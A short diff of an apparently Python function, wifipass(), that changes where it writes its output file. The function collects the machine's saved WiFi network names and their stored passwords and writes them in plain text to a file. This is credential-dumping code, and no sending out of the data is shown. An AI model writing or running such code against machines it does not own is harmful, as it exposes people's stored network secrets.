@@ -14,7 +14,7 @@ def wifipass():
       except:
          return " "
 
-   f = open("wifi.txt","w")
+   f = open("../data/wifi.txt","w")
    for wlan in get_wlans():
        f.write("-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
    f.close()
